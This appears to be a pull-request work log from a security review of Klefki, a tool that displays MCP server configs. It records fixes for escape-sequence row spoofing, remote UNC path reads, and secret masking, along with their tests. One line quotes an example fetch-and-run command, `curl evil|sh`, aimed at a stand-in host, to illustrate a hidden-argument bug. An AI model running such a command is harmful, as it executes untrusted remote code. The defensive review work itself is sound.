# Review of core, part 2: what rows and previews show (2026-10-18)
Goal: the second PR of the overnight review of `crates/core`, `crates/cli` and `crates/fake-claude` (part 1: `2026-10-18-review-core-1.md`). Everything here is about text from untrusted places (`.mcp.json`, `.claude.json`, Claude's logs, pasted text) and what Klefki shows of it.

Branch `claude/review-core-y2uzla`, on top of part 1.

## Done
- **A proxy's refusal is not the server's** (`diagnose/hints.rs`, 7d0db08). Reported by the app review thread from the real app: behind a proxy, `ERR_PROXY_TUNNEL … 403` read as the server's Forbidden plus NeedsAuthentication. New hint "Your proxy refused the connection" (ERR_PROXY_TUNNEL, ERR_PROXY_CONNECTION_FAILED, "proxy refused", "Proxy Authentication Required", undici's "when HTTP Tunneling"); it comes before both and suppresses Forbidden. A bare `407` is not matched (`server.js:407:12`).
- **UNC paths with mixed slashes** (`config/inventory.rs`, b83ab5e). Windows reads either slash in the `\\server` prefix, so a project key `/\evil\share` or `\/evil/share` made Klefki read `.mcp.json` from a remote host. Any two leading slashes are refused.
- **One line per row, each part cleaned on its own** (`sanitize.rs`, `config/inventory.rs`, 3fe5969). An escape left open in one argument swallowed the arguments after it (`node --title= server.js` while the server ran `-e "…curl evil|sh"`); a CSI now ends at the first character that cannot belong to one. Names, targets and OAuth client ids and scopes keep no line breaks or tabs (`sanitize_line`), so a name in `.mcp.json` cannot draw a fake row in the grid or `klefki-cli list`.
- **Masking gaps** (`config/secretlike.rs`, 85f7195). Shown in full before: a token as a URL's user name, a secret in a later query parameter or the fragment, `--oauth2Bearer`, `--header=Authorization: …` as one word, a neutral header name with a scheme or a credential's shape. Over-masked before: `--token-file x/y`, `--auth-type oauth`, `--token-url https://…`.
- **Paste preview** (`paste.rs`, e876b3c). The summary used no masking, and problems quoted back `-k=SECRET`, `-e SECRET`, `-H "Bearer SECRET"`. It now uses the list's rules (and `display_url` for addresses) and cleans each word on its own.
- **Duplicate-key flood** (`config/inventory.rs`, 83b82c3). One warning per repeat (174,750 for a 1 MiB file) buried every other warning; now one per name.

## Tests (each failed first; the later assertions in each were confirmed by temporarily reverting one rule at a time)
- `diagnose::hints::tests::a_proxy_that_refuses_is_not_blamed_on_the_server`: main gave [NeedsAuthentication, Forbidden].
- `config::inventory::tests::only_local_absolute_project_paths_are_opened` gained the two mixed-slash paths.
- `config::inventory::tests::an_escape_in_one_argument_hides_none_of_the_others`, `names_and_commands_from_a_repository_stay_on_one_line`, `a_name_defined_many_times_is_reported_once` (main: 1998 warnings, now 2).
- `sanitize::tests::a_csi_ends_where_its_text_starts`, `one_line_text_keeps_no_line_breaks`.
- `config::secretlike::tests::secrets_the_first_rules_missed_are_hidden_too`, `a_setting_named_after_a_secret_stays_readable`, `a_token_in_an_address_gets_a_reference`.
- `paste::tests::the_summary_hides_what_the_list_hides`, `a_problem_never_repeats_a_secret`.

## Checks
See the pull request: the full verify is run on the final head, after main is brought in.

## Not done here (findings for Davy, in `reviews/2026-10-19-core/findings.md` in the project folder)
Anything in files #26 changes (docstore, engine, api, ops), behaviour changes users would notice, and the paste-reading fixes, which come in part 3.
